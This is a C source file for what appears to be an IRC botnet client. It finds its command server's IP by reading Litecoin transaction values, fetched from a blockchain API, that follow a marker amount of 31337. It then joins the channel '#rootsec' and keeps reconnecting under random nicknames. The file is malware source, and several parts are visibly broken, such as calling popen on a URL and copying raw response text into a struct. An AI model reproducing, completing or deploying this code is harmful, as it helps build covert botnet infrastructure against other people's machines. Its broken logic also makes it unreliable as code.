#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

struct Txrefs {
    char tx_hash[256];
    double block_height;
    int tx_input_n;
    double value;
    double ref_balance;
    int confirmations;
    char confirmed[256];
    int double_spend;
};

struct Balance {
    char address[256];
    double total_received;
    double total_sent;
    double unconfirmed_balance;
    double final_balance;
    double n_tx;
    double final_n_tx;
    struct Txrefs *txrefs;
};

char* ToAddr(char* address) {
    struct in_addr addr;
    inet_pton(AF_INET, address, &(addr.s_addr));
    return inet_ntoa(addr);
}

char* Do() {
    char* address = "B8rTpz9iMfvfj1tH1zALqFm9XGatFtC00Dgq8tS2ejQ";
    char url[256];
    snprintf(url, sizeof(url), "https://api.blockcypher.com/v1/ltc/main/addrs/%s", address);

    FILE* fp = popen(url, "r");
    if (fp == NULL) {
        return NULL;
    }

    char result[4096];
    fread(result, sizeof(char), sizeof(result), fp);
    pclose(fp);

    struct Balance parsed;
    memcpy(&parsed, result, sizeof(parsed));

    int start = 0;
    int round = 0;
    char ipzinho[4096];
    int ipzinhoLen = 0;

    for (int i = 0; i < sizeof(parsed.txrefs) / sizeof(parsed.txrefs[0]); i++) {
        if (parsed.txrefs[i].tx_input_n == -1 && parsed.txrefs[i].confirmations > 0) {
            if (round == 2) {
                break;
            }
            if (start) {
                round++;
                char valueStr[32];
                snprintf(valueStr, sizeof(valueStr), "%f", parsed.txrefs[i].value);
                int valueLen = strlen(valueStr);
                if (ipzinhoLen + valueLen < sizeof(ipzinho)) {
                    strcpy(ipzinho + ipzinhoLen, valueStr);
                    ipzinhoLen += valueLen;
                }
            }

            if (parsed.txrefs[i].value == 31337) {
                start = 1;
            }
        }
    }

    char* resultStr = malloc(ipzinhoLen + 1);
    strncpy(resultStr, ipzinho, ipzinhoLen);
    resultStr[ipzinhoLen] = '\0';
    return resultStr;
}

typedef struct {
    int client;
    char botPrefix[256];
    char nickname[256];
    int port;
    char server[256];
    char channel[256];
    char ident[8];
    char hostname[5];
    char realname[6];
    char channelPasswd[256];
} Bot;

void GenerateNick(char* nickname, char* botPrefix) {
    srand(time(NULL));
    int random = rand() % 1000;
    snprintf(nickname, 256, "%s-%d", botPrefix, random);
}

char* GenerateString(int qtde) {
    char letters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    char* result = malloc((qtde + 1) * sizeof(char));

    for (int i = 0; i < qtde; i++) {
        int index = rand() % (sizeof(letters) - 1);
        result[i] = letters[index];
    }

    result[qtde] = '\0';
    return result;
}

void Send(int client, char* cmd) {
    char msg[256];
    snprintf(msg, sizeof(msg), "%s\n", cmd);
    send(client, msg, strlen(msg), 0);
}

void Join(int client, char* channel, char* password) {
    if (strlen(password) == 0) {
        Send(client, channel);
    } else {
        char cmd[256];
        snprintf(cmd, sizeof(cmd), "%s %s", channel, password);
        Send(client, cmd);
    }
}

void Ping(int client) {
    Send(client, "PONG :Pong");
}

void Print(char* buffer, int bytesRec) {
    buffer[bytesRec] = '\0';
    printf("%s\n", buffer);
}

void Connect(Bot* bot) {
    char* server = ToAddr(Do());

    struct hostent* he;
    struct in_addr** addr_list;

    he = gethostbyname(server);
    addr_list = (struct in_addr**)he->h_addr_list;

    struct sockaddr_in remoteEP;
    remoteEP.sin_family = AF_INET;
    remoteEP.sin_port = htons(bot->port);
    remoteEP.sin_addr = *addr_list[0];

    bot->client = socket(AF_INET, SOCK_STREAM, 0);
    connect(bot->client, (struct sockaddr*)&remoteEP, sizeof(remoteEP));

    char msg[256];
    snprintf(msg, sizeof(msg), "NICK %s\n", bot->nickname);
    send(bot->client, msg, strlen(msg), 0);

    snprintf(msg, sizeof(msg), "USER %s %s 0 %s\n", bot->ident, bot->hostname, bot->realname);
    send(bot->client, msg, strlen(msg), 0);

    char buffer[2048];

    Join(bot->client, bot->channel, bot->channelPasswd);

    while (1) {
        int bytesRec = recv(bot->client, buffer, sizeof(buffer) - 1, 0);
        buffer[bytesRec] = '\0';
        Print(buffer, bytesRec);

        if (strstr(buffer, "PING")) {
            Ping(bot->client);
        } else if (bytesRec == 0) {
            while (1) {
                GenerateNick(bot->nickname, bot->botPrefix);
                Connect(bot);
            }
        }
    }
}

int main() {
    Bot bot;
    bot.port = 6667;
    strncpy(bot.channel, "#rootsec", sizeof(bot.channel));
    strncpy(bot.botPrefix, "el8", sizeof(bot.botPrefix));

    Connect(&bot);

    return 0;
}
